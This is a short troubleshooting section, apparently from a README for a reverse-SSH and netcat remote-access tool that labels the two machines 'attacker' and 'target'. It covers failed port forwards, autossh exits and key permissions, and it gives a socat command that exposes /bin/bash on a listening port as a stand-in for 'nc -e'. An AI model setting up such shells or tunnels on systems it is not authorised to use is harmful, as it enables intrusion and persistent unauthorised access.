# Troubleshooting

## Common Issues

### 1. Connection Refused on Attacker’s Forwarded Port

**Symptom**: `ssh -p 2222 localhost` returns `Connection refused`.

**Possible causes**:
- Reverse forward not established. Check target logs for errors.
- SSH server `AllowTcpForwarding` is `no` or `PermitOpen` does not include the port.
- Firewall on attacker blocks local connections to that port (unlikely for `localhost`).

**Fix**:
- Ensure the target script uses `ExitOnForwardFailure=yes` and logs the error.
- Verify attacker `sshd_config` allows TCP forwarding and the specific port.
- Run `ss -tlnp | grep 2222` on attacker to confirm listening socket.

### 2. `autossh` Exits Immediately

**Symptom**: `autossh` starts but then stops.

**Possible causes**:
- Missing `autossh` package.
- Incorrect environment variables.
- Monitoring port conflict.

**Fix**:
- Install `autossh`: `sudo apt install autossh`.
- Use `-M 0` to disable monitoring port and rely on `ServerAliveInterval`.
- Run the script in foreground with verbose logging (`-v`).

### 3. `nc -e` Not Supported

**Symptom**: `nc: invalid option -- 'e'`

**Fix**:
- Use `socat` instead: `socat TCP-LISTEN:4445,reuseaddr,fork EXEC:/bin/bash`
- Or use the provided Python listener in `reverse-ssh-netcat.sh`.

### 4. SSH Key Permissions Too Open

**Symptom**: `Permissions 0644 for 'target_key' are too open.`

**Fix**:
```bash
chmod 600 target_key